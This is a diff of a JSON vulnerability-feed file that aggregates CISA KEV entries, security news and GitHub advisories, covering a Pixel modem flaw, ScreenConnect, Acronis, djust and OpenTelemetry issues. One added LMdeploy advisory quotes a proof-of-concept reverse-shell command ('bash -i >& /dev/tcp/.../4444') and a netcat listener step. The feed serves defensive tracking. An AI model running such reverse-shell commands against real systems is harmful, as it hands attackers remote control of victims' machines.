@@ -1,10 +1,29 @@
 {
-  "generated": "2026-09-16T10:24:44.218849+00:00",
-  "total": 21,
-  "kev": 0,
-  "zero_day": 14,
+  "generated": "2026-09-16T15:41:24.066712+00:00",
+  "total": 27,
+  "kev": 1,
+  "zero_day": 16,
   "enriched": 0,
   "findings": [
+    {
+      "id": "CVE-2026-58704",
+      "title": "CVE-2026-58704 \u2014 Google Pixel Improper Authorization Vulnerability",
+      "summary": "Vendor: Google | Product: Pixel. Google Pixel devices contain an improper authorization vulnerability in the cellular modem. A logic error may allow an attacker to bypass permission checks and escalate privileges. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-09-19)",
+      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-58704",
+      "published": "2026-09-16",
+      "source": "CISA KEV",
+      "tags": [
+        "cisa",
+        "kev",
+        "actively-exploited"
+      ],
+      "cve_ids": [
+        "CVE-2026-58704"
+      ],
+      "is_kev": true,
+      "is_zero_day": true,
+      "is_high_severity": false
+    },
     {
       "id": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa26-194a",
       "title": "Improve Router Hygiene to Protect Against Russian State-Sponsored Targeting",
@@ -37,6 +56,70 @@
       "is_high_severity": true
     },
     {
+      "id": "https://www.securityweek.com/aiuc-raises-40-million-to-certify-enterprise-ai-agents/",
+      "title": "AIUC Raises $40 Million to Certify Enterprise AI Agents",
+      "summary": "The company provides a standard for AI systems, testing them against risks such as jailbreaks, prompt injections, and unauthorized actions. The post AIUC Raises $40 Million to Certify Enterprise AI Agents appeared first on SecurityWeek .",
+      "link": "https://www.securityweek.com/aiuc-raises-40-million-to-certify-enterprise-ai-agents/",
+      "published": "2026-09-16T13:38:36+00:00",
+      "source": "SecurityWeek",
+      "tags": [
+        "news",
+        "research"
+      ],
+      "cve_ids": [],
+      "is_zero_day": true,
+      "is_high_severity": true
+    },
+    {
+      "id": "https://thehackernews.com/2026/09/google-patches-pixel-modem-flaw-amid.html",
+      "title": "Google Patches Pixel Modem Flaw Amid Signs of Limited Targeted Exploitation",
+      "summary": "Google has disclosed that a high-severity security flaw in its Pixel Cellular Modem has come under exploitation in the wild.\n\nThe vulnerability, tracked as CVE-2026-58704 (CVSS score: 8.0), is a privilege escalation flaw.\n\n\"In Cellular Modem, there is a possible permission bypass due to a logic error in the code,\" according to a description of the bug in the NIST National Vulnerability Database",
+      "link": "https://thehackernews.com/2026/09/google-patches-pixel-modem-flaw-amid.html",
+      "published": "2026-09-16T11:15:58+00:00",
+      "source": "The Hacker News Security",
+      "tags": [
+        "news",
+        "zeroday"
+      ],
+      "cve_ids": [
+        "CVE-2026-58704"
+      ],
+      "is_zero_day": true,
+      "is_high_severity": true
+    },
+    {
+      "id": "https://www.bleepingcomputer.com/news/security/cisa-warns-of-hackers-exploiting-critical-screenconnect-flaw/",
+      "title": "Critical ScreenConnect flaw now actively exploited in attacks",
+      "summary": "Attackers now exploit\u00a0a critical-severity ConnectWise ScreenConnect vulnerability in the wild, according to the U.S. Cybersecurity and Infrastructure Security Agency (CISA). [...]",
+      "link": "https://www.bleepingcomputer.com/news/security/cisa-warns-of-hackers-exploiting-critical-screenconnect-flaw/",
+      "published": "2026-09-16T11:14:28+00:00",
+      "source": "Bleeping Computer",
+      "tags": [
+        "news",
+        "malware"
+      ],
+      "cve_ids": [],
+      "is_zero_day": true,
+      "is_high_severity": true
+    },
+    {
+      "id": "https://thehackernews.com/2026/09/acronis-cpanel-backup-plugin.html",
+      "title": "Acronis cPanel Backup Plugin Vulnerability Exploited in Targeted Attacks",
+      "summary": "Acronis has warned that a high-severity security flaw in its Backup plugin for cPanel and Web Host Manager (WHM) deployments has been exploited in the wild.\n\nThe vulnerability, tracked as CVE-2026-87886 (CVSS score: 7.8), is described as a case of local privilege escalation due to insecure file permissions. It affects the following versions -\n\n\n  Acronis Backup plugin for cPanel & WHM (Linux",
+      "link": "https://thehackernews.com/2026/09/acronis-cpanel-backup-plugin.html",
+      "published": "2026-09-16T11:08:54+00:00",
+      "source": "The Hacker News Security",
+      "tags": [
+        "news",
+        "zeroday"
+      ],
+      "cve_ids": [
+        "CVE-2026-87886"
+      ],
+      "is_zero_day": true,
+      "is_high_severity": true
+    },
+    {
       "id": "https://thehackernews.com/2026/09/active-exploitation-attempts-target.html",
       "title": "Active Exploitation Attempts Target WSO2 API Manager JWT Bypass With Forged Admin Tokens",
       "summary": "A critical security flaw in WSO2 API Manager has come under active exploitation in the wild, according to findings from watchTowr.\n\nThe vulnerability, tracked as CVE-2026-5430 (CVSS score: 9.8/10.0), is a case of improper verification of a cryptographic signature that could result in account takeover. Hacktron Team has been credited with discovering and reporting the flaw.\n\n\"JWT authentication",
@@ -65,23 +148,6 @@
         "malware"
       ],
       "cve_ids": [],
-      "is_zero_day": true,
-      "is_high_severity": true
-    },
-    {
-      "id": "https://www.rapid7.com/blog/post/etr-cve-2026-76461-critical-cisco-secure-email-gateway-vulnerability-exploited-in-the-wild",
-      "title": "CVE-2026-76461: Critical Cisco Secure Email Gateway Vulnerability Exploited in the Wild",
-      "summary": "Overview On September 14, 2026, Cisco published a security advisory for CVE-2026-76461 , a critical SQL injection vulnerability affecting Cisco AsyncOS Software for Cisco Secure Email Gateway. The vulnerability has a reported CVSS v3.1 base score of 9.8 and could allow an unauthenticated, remote attacker to execute arbitrary commands with root privileges on an affected appliance. Cisco Secure Email Gateway, formerly known as IronPort Email Security Appliance, is an enterprise email security product that inspects inbound and outbound email for threats including phishing, malware, spam, and business email compromise. Because affected gateways process externally delivered email as part of their normal operation, exploitation does not require access to an administrative interface or authentication. An attacker can reportedly trigger the vulnerability by sending a specially crafted email through a vulnerable gateway. CVE-2026-76461 was added to CISA's Known Exploited Vulnerabilities ( KEV ) catalog on the same day as the vendor disclosed the vulnerability, indicating that CVE-2026-76461 was exploited as a zero-day prior to disclosure. Cisco noted that their PSIRT became aware of active exploitation in September 2026. At the time of publication, there is no public proof-of-concept exploit code available, and no attribution for the current threat actor activity. Mitigation guidance Organizations running Cisco Secure Email Gateway should prioritize upgrading to a vendor-supplied fixed version on an emergency basis, outside of normal patching cycles. Affected Version Fixed Version 15.5 and earlier 15.5.5-014 16.0 16.0.4-302 16.5 16.5.0-780 Given the reported active exploitation and the ability to achieve unauthenticated root-level command execution through malicious email processing, organizations should prioritize patching rather than relying solely on network controls or monitoring. Cisco also strongly recommends that customers migrate to the latest product version, 16.5.0",
-      "link": "https://www.rapid7.com/blog/post/etr-cve-2026-76461-critical-cisco-secure-email-gateway-vulnerability-exploited-in-the-wild",
-      "published": "2026-09-15T12:22:50+00:00",
-      "source": "Rapid7 Blog",
-      "tags": [
-        "research",
-        "metasploit"
-      ],
-      "cve_ids": [
-        "CVE-2026-76461"
-      ],
       "is_zero_day": true,
       "is_high_severity": true
     },
@@ -214,33 +280,73 @@
       "is_high_severity": false
     },
     {
-      "id": "https://www.bleepingcomputer.com/news/security/what-zero-day-response-should-be-in-the-post-mythos-era/",
-      "title": "What Zero-Day Response Should Be in the Post-Mythos Era",
-      "summary": "AI is shrinking the time between vulnerability disclosure and exploitation, leaving defenders less time to wait for patches or public exploits. Picus Security explains how exploitability validation, security control testing, and autonomous pentesting can help teams close exposure gaps before attackers arrive. [...]",
-      "link": "https://www.bleepingcomputer.com/news/security/what-zero-day-response-should-be-in-the-post-mythos-era/",
-      "published": "2026-09-15T13:45:54+00:00",
-      "source": "Bleeping Computer",
+      "id": "CVE-2025-59953",
+      "title": "LMdeploy has Remote Code Execution by Pickle Deserialization via zmq_rpc.call_and_response() in InterLM/lmdeploy",
+      "summary": "### Description\n\nThe LMdeploy\u00a0implements an\u00a0rpc server (AsyncRPCServer in zmq_rpc.py)\u00a0for supporting the RPC communications. In its core functionality\u00a0call_and_response(), I found it will directly use the\u00a0pickles.loads()\u00a0to deserialize the received messages without any sanitization, hence resulting in a remote code execution vulnerability by this RPC server.\n\n### Proof of Concept\n\n* Step1:\nThe victim user starts a RPC server that connects to its network interface. We give our example code (server.py) in the attachment, you can reproduce directly with server.py.\n\n* Step2:\nThe attacker can then send malicious pickle dump data to the remote RPC address for the attack. We give a example to show how can an attacker acquire a command shell:\n<img width=\"832\" height=\"324\" alt=\"image\" src=\"https://github.com/user-attachments/assets/03b9654d-e25b-4e93-903a-2aae8b12e704\" />\n\nIn this example, attacker modifies AsyncRPCClient and send a request containing malicious pickle dump data to let the victim execute command \u201cbash -c \u2018bash -i >& /dev/tcp/202.112.47.27/4444 0>&1\u2019\u201d, where 202.112.47.27 is an attacker\u2019s server. \nTwo points require special attention:\n1.The client code originally only connects to localhost over a socket, but an attacker can easily change localhost to another IP to perform remote exploitation, because the RPC server does not validate the connecting IP.\n2.The RPC server\u2019s port is randomized, but an attacker can still scan ports to find and exploit it; in our demo we explicitly set the target port.\n\n\n* Step3:\nAttacker can use nc tool (nc -l 4444) to create a reverse shell and wait for connection. Then, attacker runs the client to send the malicious request. Since the pickle deserialization vulnerability, the victim rpc server will execute the malicious command and consequently let attacker get the command shell of victim machine.\n\nWe also give a demo video in the attachment, along with modified zmq_rpc.py. When you reproduce this issue in the client side (as an a",
+      "link": "https://github.com/advisories/GHSA-5h8j-6crg-7rmw",
+      "published": "2026-09-16T15:34:27Z",
+      "source": "GitHub Security Advisories",
       "tags": [
-        "news",
-        "malware"
-      ],
-      "cve_ids": [],
-      "is_zero_day": true,
-      "is_high_severity": false
-    },
-    {
-      "id": "https://www.securityweek.com/acronis-patches-exploited-vulnerability-in-cpanel-backup-plugin/",
-      "title": "Acronis Patches Exploited Vulnerability in cPanel Backup Plugin",
-      "summary": "CVE-2026-87886 is a high-severity insecure file permissions flaw that can lead to local privilege escalation. The post Acronis Patches Exploited Vulnerability in cPanel Backup Plugin appeared first on SecurityWeek .",
-      "link": "https://www.securityweek.com/acronis-patches-exploited-vulnerability-in-cpanel-backup-plugin/",
-      "published": "2026-09-16T09:52:31+00:00",
-      "source": "SecurityWeek",
-      "tags": [
-        "news",
-        "research"
+        "github",
+        "advisories",
+        "oss"
       ],
       "cve_ids": [
-        "CVE-2026-87886"
+        "CVE-2025-59953"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-61595",
+      "title": "djust: Multi-tenant isolation fails open on the WebSocket/SSE path, disclosing other tenants' data",
+      "summary": "### Impact\n`djust.tenants` isolation was enforced only on the HTTP path. The current tenant was stored in `threading.local()` and set exclusively by the HTTP-only `TenantMiddleware`, so on the live (WebSocket/SSE) path `get_current_tenant()` was always `None` during mount and every event handler \u2014 and the tenant-aware `QuerySet` manager failed **OPEN** (returned the unfiltered queryset, ignoring `STRICT_MODE`), disclosing **every** tenant's rows to whoever held the socket. `threading.local` was additionally shared across connections on the `sync_to_async` executor thread.\n\n### Patches\nFixed in **djust 1.0.7**. Tenant storage moved to a `contextvars.ContextVar` (per async task); the resolved tenant is bound around WS/SSE mount and every dispatch; both managers scope the base queryset once and fail **CLOSED** (`.none()` under the default `STRICT_MODE`); and system check **S006** warns when `STRICT_MODE=False`.\n\n### Workarounds\nNo workaround on the live path short of upgrading.",
+      "link": "https://github.com/advisories/GHSA-3492-cvg7-9mr2",
+      "published": "2026-09-16T15:32:10Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-61595"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-61598",
+      "title": "djust: Client mass-assignment of arbitrary view attributes via the default dj-model update_model handler",
+      "summary": "### Impact\n`djust.mixins.model_binding.ModelBindingMixin` provides a default `update_model` event handler and is part of the **LiveView base MRO**, so every LiveView exposes it. It `setattr`s a view attribute whose **name is client-supplied** (`field`), gated only by: reject `_`-prefixed names; reject a **14-entry denylist** of framework internals (`FORBIDDEN_MODEL_FIELDS`); optional `allowed_model_fields` which **defaults to None = allow all**; and `hasattr` existence.\n\nResult: a client can set **any public, existing view attribute \u2014 not just the fields actually bound with `dj-model=` in the rendered template**. The denylist covers framework plumbing but nothing about developer business/authz state, and the allowlist is opt-in (off by default). A developer who binds one `dj-model=\"search\"` input and also keeps `self.account_id` / `self.is_admin` / `self.total_price` as view state does not realize a client can set ALL of them via `{type:event, event:\"update_model\", params:{field, value}}` over the WebSocket. Type coercion matches the target attribute's type (so `\"true\"` -> bool True), aiding the attacker.\n\n**Severity High** for apps that hold authorization/ownership/business state in public view attributes (the normal djust pattern) -> state tampering / IDOR / authz-flag manipulation; Low otherwise. Default-on across every LiveView. For a public (no-login) view an anonymous client can mass-assign; for an authenticated view a logged-in user can tamper their own session's view state (the IDOR/authz vector when downstream handlers act on it without re-authorizing).\n\nReproduced: a view with `account_id/is_admin/total_price` (none bound with dj-model) had all three set via `update_model` calls.\n\n### Patches\nRestrict the default handler to fields actually exposed via `dj-model=`: have the template renderer record the bound-field set per render and reject any `field` outside it (preferred, secure + zero-config); or make `allowed_model_fields` fail-closed (required). Keep `",
+      "link": "https://github.com/advisories/GHSA-cc7c-9jff-58wj",
+      "published": "2026-09-16T13:55:48Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-61598"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-81192",
+      "title": "OpenTelemetry.Resources.Host vulnerable to arbitrary code execution via local PATH hijacking on macOS",
+      "summary": "### Summary\n\nThe `OpenTelemetry.Resources.Host` NuGet package is affected by an untrusted search path vulnerability on macOS. The `host.id` resource attribute detector launches the `sh` and `ioreg` executables by bare name rather than by absolute path, so both are resolved\nthrough the `PATH` environment variable.\n\nA local attacker who is less privileged than the host application, and who can influence `PATH` or write to a directory that appears in `PATH` ahead of the system directories, can have an arbitrary binary executed in the application's security context, resulting in local\ncode execution/privilege escalation.\n\n### Details\n\nThe implementation of the host detector macOS has always invoked `ioreg` and `sh` via their bare names since it was implemented by [open-telemetry/opentelemetry-dotnet-contrib#1631](https://github.com/open-telemetry/opentelemetry-dotnet-contrib/pull/1631).\n\nThe vulnerability was fixed by [open-telemetry/opentelemetry-dotnet-contrib#4760](https://github.com/open-telemetry/opentelemetry-dotnet-contrib/pull/4760) which executes `ioreg` directly using its absolute path.\n\n### Impact\n\nApplications running on **macOS** that use the `OpenTelemetry.Resources.Host` detector when an attacker who is *less privileged* than the application process can influence `PATH` or write to a `PATH` directory that precedes the system directories (e.g. a higher-privileged service with a user-writable directory in its search path, or a process inheriting an attacker-influenced environment). The attacker gains code execution in the application's security context through an attacker-controlled `ioreg` executable.\n\n### Mitigation\n\nThis vulnerability only affect macOS hosts - Linux and Windows hosts are unaffected.\n\n### Workarounds\n\nNone known.\n\n### References\n\n- [GHSA-9h8m-3fm2-qjrq](https://github.com/open-telemetry/opentelemetry-go/security/advisories/GHSA-9h8m-3fm2-qjrq)\n- [open-telemetry/opentelemetry-dotnet-contrib#4760](https://github.com/open-telemetry/opentelem",
+      "link": "https://github.com/advisories/GHSA-v8pv-4842-x354",
+      "published": "2026-09-16T13:54:16Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-81192"
       ],
       "is_zero_day": false,
       "is_high_severity": true
